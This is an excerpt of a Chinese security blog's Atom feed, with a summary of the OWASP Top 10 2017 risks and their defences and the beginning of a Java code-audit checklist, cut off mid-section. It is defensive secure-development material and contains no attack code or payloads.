    <summary type="html">
    
      &lt;p&gt;Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。它主要用来做安全性渗透测试,代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具使用" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP 10</title>
    <link href="http://yoursite.com/2018/08/14/OWASP-TOP-10/"/>
    <id>http://yoursite.com/2018/08/14/OWASP-TOP-10/</id>
    <published>2018-08-14T07:53:10.000Z</published>
    <updated>2018-08-14T07:59:44.496Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>开源Web应用安全项目（OWASP ）是一个开放的社区，致力于帮助各企业组织开发、购买和维护可信任的应用程序。</p></blockquote><a id="more"></a><h3 id="A1-注入"><a href="#A1-注入" class="headerlink" title="A1:注入"></a>A1:注入</h3><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p><p><strong>影响</strong>：</p><p>注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机完全接管。</p><p><strong>应用程序脆弱</strong>：</p><ul><li>用户提供的数据没有经过应用程序的验证、过滤或净化</li><li>动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。</li><li>在ORM搜索参数中使用了恶意数据，这样搜索就得包含敏感或未授权的数据。</li><li>恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语句、命令或存储过程中包含结构和恶意数据。</li></ul><p><strong>如何防止</strong>：</p><ul><li>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。</li><li>使用正确的或“白名单”的具有恰当规范化的验证方法同样会有助于防止注入攻击，但这个不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。</li><li>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符，OWASP的Java Encoder和雷士的库提供了这样的转义例程。</li><li>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</li></ul><h3 id="A2：失效的身份认证"><a href="#A2：失效的身份认证" class="headerlink" title="A2：失效的身份认证"></a>A2：失效的身份认证</h3><p>通常。通过错误使用程序的身份认证和会话管理功能，红记者能后破译密码，密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久冒充其他用户的身份。</p><p><strong>影响</strong>：</p><ul><li>攻击者只需要访问几个账户，或者只需要一个管理员账户就可以破坏我们的系统，根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</li></ul><p><strong>脆弱性</strong>：</p><ul><li>允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</li><li>允许暴力破解或其他自动攻击。 </li><li>允许默认的、弱的或众所周知的密码，例如“Password1”或 “admin/admin”。 </li><li>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的 答案”，这是不安全的。 </li><li>使用明文、加密或弱散列密。</li><li>缺少或失效的多因素身份验证。 </li><li>暴露URL中的会话ID（例如URL重写）。 </li><li>在成功登录后不会更新会话ID。 </li><li>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证 令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。</li></ul><p><strong>防范</strong>：</p><ul><li>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、 暴力破解和被盗凭据再利用攻击。</li><li>不要使用发送或部署默认的凭证，特别是管理员用户。</li><li>执行弱密码检查，例如测试新或变更的密码。</li><li>将密码长度、复杂性和循环策略，或其他现代的基于证据的密码策略相一致。</li><li>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同 的消息，用以抵御账户枚举攻击。 </li><li>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填 充、暴力破解或其他攻击被检测时提醒管理员。</li><li>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的 新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、 闲置、绝对超时后使其失效</li></ul><h3 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3:敏感数据泄露"></a>A3:敏感数据泄露</h3><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可 以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p><p><strong>脆弱性</strong>：</p><ul><li>在数据传输过程中是否使用明文传输？这和传输协议相关，如： HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通 信，如：负载平衡器、Web服务器或后端系统之间的通信。</li><li>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包 含备份数据？</li><li>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加 密算法？</li><li>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者 缺少恰当的密钥管理或密钥回转？ </li><li>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和 传输协议是否被加密？</li><li>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证 书的有效性</li></ul><p><strong>防范</strong>：</p><ul><li>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</li><li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保 护敏感数据。</li><li>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过 PCI DSS标记或拦截。未存储的数据不能被窃取。 </li><li>确保存储的所有敏感数据被加密。 </li><li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 </li><li>确保传输过程中的数据被加密，如：使用TLS。确保数据加密被 强制执行，如：使用HTTP严格安全传输协议（HSTS ）。 </li><li>禁止缓存对包含敏感数据的响应。 </li><li>确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、 bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受 范围。 </li><li>单独验证每个安全配置项的有效性。</li></ul><h3 id="A4：XML外部实体（XXE）"><a href="#A4：XML外部实体（XXE）" class="headerlink" title="A4：XML外部实体（XXE）"></a>A4：XML外部实体（XXE）</h3><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃 取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻 击。</p><p>如果攻击者可以上传XML文档或者在 XML文档中添加恶意内容，通过易受 攻击的代码、依赖项或集成，他们就 能够攻击含有缺陷的XML处理器。</p><p><strong>影响</strong>：</p><p>XXE缺陷可用于提取数据、执行远程 服务器请求、扫描内部系统、执行拒 绝服务攻击和其他攻击。</p><p>业务影响取决于所有受影响的应用程 序和数据保护需求。</p><p><strong>脆弱性</strong>：</p><ul><li>您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件， 并提交给XML处理器解析。 </li><li>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用 了文档类型定（DTDs）。因为禁用DTD进程的确切机制因处 理器而不同，更多资料请参考：《OWASP Cheat Sheet ‘XXE Prevention‘ 》。 </li><li>如果为了实现安全性或单点登录（SSO），您的应用程序使用 SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。</li><li>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传 递到SOAP框架，那么它可能受到XXE攻击。</li><li>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括： Billion Laughs 攻击。</li></ul><p><strong>防范</strong>：</p><ul><li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进 行序列化。</li><li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器 和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高 版本。 </li><li>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》，在应用程序 的所有XML解析器中禁用XML外部实体和DTD进程。 </li><li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理， 以防止在XML文档、标题或节点中出现恶意数据。 </li><li>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证 方法来验证上传的XML文件。 </li><li>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的 最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。</li></ul><h3 id="A5-失效的访问控制"><a href="#A5-失效的访问控制" class="headerlink" title="A5:失效的访问控制"></a>A5:失效的访问控制</h3><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数 据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><p><strong>影响</strong>：</p><p>攻击者可以冒充用户、管 理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。</p><p>业务影响取决于应用程序和数据的保护需求。</p><p><strong>脆弱性</strong>：</p><ul><li>通过修改 URL、内部应用程序状态或 HTML页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。 </li><li>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。 </li><li>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充 当管理员。</li><li>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权 限的cookie 或隐藏字段。</li><li>CORS配置错误允许未授权的API访问。 </li><li>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看 到的页面、或作为标准用户访问具有相关权限的页面、或API没 有对POST、PUT和DELETE强制执行访问控制。</li></ul><p><strong>防范</strong>：</p><ul><li>除公有资源外，默认情况下拒绝访问。 </li><li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们， 包括最小化CORS使用。 </li><li>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、 读取、更新或删除的任何记录。 </li><li>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域 模型强制执行。 </li><li>禁用 Web服务器目录列表，并确保文件元数据（如：git）不存 在于 Web的根目录中。</li><li>记录失败的访问控制，并在适当时向管理员告警（如：重复故 障）。</li><li>对API和控制器的访问进行速率限制，以最大限度地降低自动化 攻击工具的危害。</li><li>当用户注销后，服务器上的JWT令牌应失效。</li></ul><h3 id="A6：安全配置错误"><a href="#A6：安全配置错误" class="headerlink" title="A6：安全配置错误"></a>A6：安全配置错误</h3><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云 存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所 有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><p>通常，攻击者能够通过未修复的漏洞、 访问默认账户、不再使用的页面、未 受保护的文件和目录等来取得对系统 的未授权的访问或了解。</p><p><strong>影响</strong>：</p><p>这些漏洞使攻击者能经常访问一些未 授权的系统数据或功能。有时，这些 漏洞导致系统的完全攻破。 业务影响取决于您的应用程序和数据 的保护需求</p><p><strong>脆弱性</strong>：</p><ul><li>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的 权限配置错误。 </li><li>应用程序启用或安装了不必要的功能（例如：不必要的端口、服 务、网页、帐户或权限）。 </li><li>默认帐户的密码仍然可用且没有更改。 </li><li>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</li><li>对于更新的系统，禁用或不安全地配置最新的安全功能。 </li><li>应用程序服务器、应用程序框架（如：Struts、Spring、 ASP.NET）、库文件、数据库等没有进行安全配置。 </li><li>服务器不发送安全标头或指令，或者未对服务器进行安全配置。</li><li>您的应用软件已过期或易受攻击</li></ul><p><strong>防范</strong>：</p><ul><li>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。 开发、质量保证和生产环境都应该进行相同配置，并且，在每个 环境中使用不同的密码。这个过程应该是自动化的，以尽量减少 安装一个新安全环境的耗费</li><li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档 和示例。移除或不安装不适用的功能和框架。</li><li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并 将其作为更新管理过程的一部分。在检查过程中，应特别注意云存储权限（如： S3桶权限）。</li><li>一个能在组件和用户间提供有效的分离和安全性的分段应用程 序架构，包括：分段、容器化和云安全组。 • 向客户端发送安全指令，如：安全标头。</li><li>在所有环境中能够进行正确安全配置和设置的自动化过程。</li></ul><h3 id="A7：跨站脚本（XSS）"><a href="#A7：跨站脚本（XSS）" class="headerlink" title="A7：跨站脚本（XSS）"></a>A7：跨站脚本（XSS）</h3><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或 JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器 中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p><strong>影响</strong>：</p><p>XSS对于反射和DOM的影响是中 等的，而对于存储的XSS，XSS的 影响更为严重，譬如在受攻击者的 浏览器上执行远程代码，例如：窃 取凭证和会话或传递恶意软件等</p><p>脆弱性：</p><p>存在三种XSS类型，通常针对用户的浏览器： </p><ul><li>反射式XSS：应用程序或API包括未经验证和未经转义的用户输入， 作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者 的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指 向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站， 广告或类似内容。</li><li>存储式XSS：你的应用或者API将未净化的用户输入存储下来了， 并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一 般被认为是高危或严重的风险。</li><li>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的 JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的 来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript API。</li></ul><p>典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、 对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其 他用户侧的攻击。</p><p><strong>防范</strong>：</p><ul><li>使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0 或 React JS。了解每个框架的XSS保护的局限性，并适当地处 理未覆盖的用例。</li><li>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML 输出的上下文（包括：主体、属性、JavaScript、CSS或URL） 对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据 转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》 。 </li><li>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》 描述的类似上下文敏感的转义技术应用于浏览器API。</li><li>使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果 不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径 遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有 效的。</li></ul><h3 id="A8-不安全的反序列化"><a href="#A8-不安全的反序列化" class="headerlink" title="A8:不安全的反序列化"></a>A8:不安全的反序列化</h3><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以 利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p><p>对反序列化的利用是有点困难的。因 为在不更改或调整底层可被利用代码 的情况下，现成的反序列化漏洞很难 被使用</p><p><strong>影响</strong>：</p><p>反序列化缺陷的影响不能被低估。它 们可能导致远程代码执行攻击，这是 可能发生的最严重的攻击之一。业务影响取决于应用程序和数据的保 护需求。</p><p>脆弱性：</p><ul><li>这可能导致两种主要类型的攻击：</li><li>如果应用中存在可以在反序列化过程中或者之后被改变行为的类， 则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我 们将其称为对象和数据结构攻击。</li><li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有 的数据结构，但内容发生了变化。</li></ul><p><strong>在应用程序中</strong>，序列化可能被用于:</p><ul><li>远程和进程间通信（RPC / IPC） </li><li>连线协议、Web服务、消息代理</li><li>缓存/持久性 </li><li>数据库、缓存服务器、文件系统 </li><li>HTTP cookie、HTML表单参数、API身份验证令牌</li></ul><p><strong>防范</strong>：</p><ul><li>执行完整性检查，如：任何序列化对象的数字签名，以防止恶 意对象创建或数据篡改。</li><li>在创建对象之前强制执行严格的类型约束，因为代码通常被期 望成一组可定义的类。绕过这种技术的方法已经被证明，所以 完全依赖于它是不可取的。</li><li>如果可能，隔离运行那些在低特权环境中反序列化的代码。 </li><li>记录反序列化的例外情况和失败信息，如：传入的类型不是预 期的类型，或者反序列处理引发的例外情况。</li><li>限制或监视来自于容器或服务器传入和传出的反序列化网络连 接。</li><li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li></ul><h3 id="A9：使用含有已知漏洞的组件"><a href="#A9：使用含有已知漏洞的组件" class="headerlink" title="A9：使用含有已知漏洞的组件"></a>A9：使用含有已知漏洞的组件</h3><p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏 洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组 件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><p><strong>影响</strong>：</p><p>虽然对于一些已知的漏洞其影响很小， 但目前很多严重的安全事件都是利用 组件中的已知漏洞。根据你所要保护 的资产，此类风险等级可能会很高。</p><p><strong>脆弱性</strong>：</p><ul><li>如果你不知道所有使用的组件版本信息（包括：服务端和客户 端）。这包括了直接使用的组件或其依赖的组件。 </li><li>如果软件易受攻击，不再支持或者过时。这包括：OS、Web服 务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、 API和所有的组件、运行环境和库。</li><li>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</li><li>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。 很可能发生这种情况：根据变更控制，每月或每季度进行升级， 这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。</li><li>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼 容性测试。</li><li>如果你没有对组件进行安全配置</li></ul><p><strong>防范</strong>：</p><ul><li>移除不使用的依赖、不需要的功能、组件、文件和文档。</li><li>利用如 versions、DependencyCheck 、retire.js等工具来持续的 记录客户端和服务器端以及它们的依赖库的版本信息。持续监控 如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软 件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警 告邮件。</li><li>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡 改或加入恶意漏洞的风险 </li><li>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打 补丁，可以考虑部署虚拟补丁来监控、检测或保护。</li></ul><p>每个组织都应该制定相应的计划，对整个软件生命周期进行监控、 评审、升级或更改配置。</p><h3 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10:不足的日志记录和监控"></a>A10:不足的日志记录和监控</h3><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持 续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超 过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p><p><strong>脆弱性</strong>：</p><p>下列情况会导致不足的日志记录、检测、监控和响应：</p><ul><li>未记录可审计性事件，如：登录、登录失败和高额交易。</li><li>告警和错误事件未能产生或产生不足的和不清晰的日志信息。</li><li>没有利用应用系统和API的日志信息来监控可疑活动。</li><li>日志信息仅在本地存储。</li><li>没有定义合理的告警阈值和制定响应处理流程。</li><li>渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触 发告警</li><li>对于实时或准实时的攻击，应用程序无法检测、处理和告警</li></ul><p><strong>防范</strong>：</p><p>根据应用程序存储或处理的数据的风险：</p><ul><li>确保所有登录、访问控制失败、输入验证失败能够被记录到日 志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐 户，并为后期取证预留足够时间。</li><li>确保日志以一种能被集中日志管理解决方案使用的形式生成</li><li>确保高额交易有完整性控制的审计信息，以防止篡改或删除， 例如审计信息保存在只能进行记录增加的数据库表中。</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被 发现和应对。</li><li>建立或采取一个应急响应机制和恢复计划，例如：NIST 80061 rev 2或更新版本。</li></ul><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf" target="_blank" rel="noopener">http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf</a></p><p><a href="https://blog.csdn.net/SKI_12/article/details/69952026?locationNum=13&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/69952026?locationNum=13&amp;fps=1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开源Web应用安全项目（OWASP ）是一个开放的社区，致力于帮助各企业组织开发、购买和维护可信任的应用程序。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Java代码审计（整理）</title>
    <link href="http://yoursite.com/2018/08/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/"/>
    <id>http://yoursite.com/2018/08/13/Java代码审计（整理）/</id>
    <published>2018-08-13T15:02:00.000Z</published>
    <updated>2018-08-13T15:15:56.563Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-测试工具"><a href="#0x01-测试工具" class="headerlink" title="0x01 测试工具"></a>0x01 测试工具</h3><h4 id="1-1-反编译java类"><a href="#1-1-反编译java类" class="headerlink" title="1.1 反编译java类"></a>1.1 反编译java类</h4><p>如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译</p><a id="more"></a><p><img src="/images/代码审计/11.png" alt="upload successful"></p><p>选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码</p><p><img src="/images/代码审计/12.png" alt="upload successful"></p><p>1.2 Eclipse环境审计</p><p>使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。</p><p><img src="/images/代码审计/13.png" alt="upload successful"></p><h3 id="0x02-认证管理"><a href="#0x02-认证管理" class="headerlink" title="0x02 认证管理"></a>0x02 认证管理</h3><h4 id="2-1-图形验证码"><a href="#2-1-图形验证码" class="headerlink" title="2.1 图形验证码"></a>2.1 图形验证码</h4><ul><li>用户登录过程是否有图形验证码保护，防止自动化程序猜测密码</li><li>验证码复杂度是否符合要求（干扰、变形）</li><li>验证码在使用过一次后是否会自动刷新</li><li>验证码明文是否会被传送给客户端（页面或Cookie）</li><li>验证码是否在被保护的操作进行前来验证（无验证或无效验证）</li></ul><h3 id="2-2-认证实现"><a href="#2-2-认证实现" class="headerlink" title="2.2 认证实现"></a>2.2 认证实现</h3><ul><li>用户认证过程中，用户名和密码合法性的检查方式是否符合要求</li></ul><p>较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文</p><ul><li>是否具备用户注销功能</li></ul><p>用户注销时是否清理了当前用户会话</p><ul><li>是否会将密码作为重定向的一部分进行传送</li></ul><p>在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。</p><ul><li>认证过程中对于用户名错误和密码错误提示是否相同</li></ul><p>统一用户名和密码错误提示，可以降低账号、密码被猜解的风险</p><ul><li>检查用户认证页面是否对认证失败的次数进行了限制</li></ul><h3 id="0x03-授权管理"><a href="#0x03-授权管理" class="headerlink" title="0x03 授权管理"></a>0x03 授权管理</h3><h4 id="3-1-授权实现"><a href="#3-1-授权实现" class="headerlink" title="3.1 授权实现"></a>3.1 授权实现</h4><ul><li>应用的用户是否具有角色的区分</li></ul><p>明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权</p><ul><li>应用是否具备统一的（或独立）的权限控制模块</li></ul><p>大部分的大型应用都会采用统一的权限控制模块</p><ul><li>应用的权限控制模块是否存在漏洞</li><li>页面/功能是否使用了权限控制（模块）</li></ul><p>识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。</p><ul><li>页面的权限控制是否正确</li></ul><p>部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源</p><h4 id="3-2-授权管理"><a href="#3-2-授权管理" class="headerlink" title="3.2 授权管理"></a>3.2 授权管理</h4><ul><li>高权限用户分析</li></ul><p>分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等</p><ul><li>默认用户分析</li></ul><p>分析系统是否存在默认用户、密码，密码复杂度等。</p><h3 id="0x04-输入-输出验证"><a href="#0x04-输入-输出验证" class="headerlink" title="0x04 输入/输出验证"></a>0x04 输入/输出验证</h3><h4 id="4-1-SQL注入防护"><a href="#4-1-SQL注入防护" class="headerlink" title="4.1 SQL注入防护"></a>4.1 SQL注入防护</h4><ul><li>是否存在全局过滤器</li></ul><p>过滤器配置、过滤函数等</p><ul><li>过滤器是否可以过滤所有查询请求</li></ul><p>请求是否都按要求经过过滤器处理</p><ul><li>过滤器的过滤是否符合要求</li></ul><p>初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充</p><ul><li>是否使用了预查询机制</li></ul><p>预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。</p><ul><li>是否存在SQL语句拼接</li></ul><p>某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。</p><h4 id="4-2-跨站攻击防护"><a href="#4-2-跨站攻击防护" class="headerlink" title="4.2 跨站攻击防护"></a>4.2 跨站攻击防护</h4><ul><li>是否存在全局XSS过滤器(论坛的过滤库)</li><li>过滤器的过滤是否符合要求</li><li>是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*）</li></ul><p>某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。</p><ul><li>输出的时候是否进行编码（HTML、JS）</li></ul><h4 id="4-3-CSRF攻击防护"><a href="#4-3-CSRF攻击防护" class="headerlink" title="4.3 CSRF攻击防护"></a>4.3 CSRF攻击防护</h4><ul><li>Web表单是否使用了Token（或验证码）</li><li>Web表单提交（成功或不成功）后token（或验证码）是否重置</li><li>检查Token的生成算法是否安全</li></ul><p>可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。</p><ul><li>检查服务器获取Web表单参数值的方式</li></ul><p>如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。</p><h4 id="4-4-文件上传防护"><a href="#4-4-文件上传防护" class="headerlink" title="4.4 文件上传防护"></a>4.4 文件上传防护</h4><ul><li>是否限制了上传文件的扩展名</li></ul><p>以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名</p><ul><li>是否对上传文件进行了重命名操作</li></ul><p>重命名操作是否安全，防止重命名过程中产生二次风险</p><ul><li>是否对上传文件的存放位置禁止了脚本执行</li></ul><h4 id="4-5-文件下载防护"><a href="#4-5-文件下载防护" class="headerlink" title="4.5 文件下载防护"></a>4.5 文件下载防护</h4><ul><li>是否存在客户端指定文件名的下载功能</li><li>直接指定文件名的下载是否允许客户端指定路径</li><li>对于不同用户的文件在下载时是否进行了权限控制</li></ul><p>文件下载功能中是否对用户的权限进行了检查。</p><h4 id="4-6-重定向与转发保护"><a href="#4-6-重定向与转发保护" class="headerlink" title="4.6 重定向与转发保护"></a>4.6 重定向与转发保护</h4><ul><li>是否具有客户端控制的重定向或转发</li><li>是否定义了重定向的信任域名或主机列表</li><li>是否对客户端的重定向或转发请求进行检查</li></ul><h3 id="0x05-会话管理"><a href="#0x05-会话管理" class="headerlink" title="0x05 会话管理"></a>0x05 会话管理</h3><h4 id="5-1-Session管理"><a href="#5-1-Session管理" class="headerlink" title="5.1 Session管理"></a>5.1 Session管理</h4><ul><li>session信息是否放在url里面</li></ul><p>通过应用服务器的配置检查</p><ul><li>执行业务功能时，是否检查了当前用户session身份</li></ul><p>从代码部分、从配置部分检查，需要根据应用实际使用的验证方式</p><ul><li>成功登陆之后是否会更新SessionID</li></ul><p>认证成功后是否强制刷新用户使用的SessionID</p><ul><li>session是否有超时注销功能</li></ul><p>检查Session的超时时间设置是否符合要求，默认是20~30分钟</p><h4 id="5-2-Cookie管理"><a href="#5-2-Cookie管理" class="headerlink" title="5.2 Cookie管理"></a>5.2 Cookie管理</h4><ul><li>是否会在Cookie中存储明文或简单编码/加密过的密码</li><li>是否会在Cookie中存储应用的特权标识</li><li>是否设置了Cookie的有效域和有效路径</li><li>是否设置了合适的Cookie有效时间</li></ul><p>如果生存时间在20~30分钟左右，使用Session方式会更加安全</p><h3 id="0x06-密码管理"><a href="#0x06-密码管理" class="headerlink" title="0x06 密码管理"></a>0x06 密码管理</h3><h4 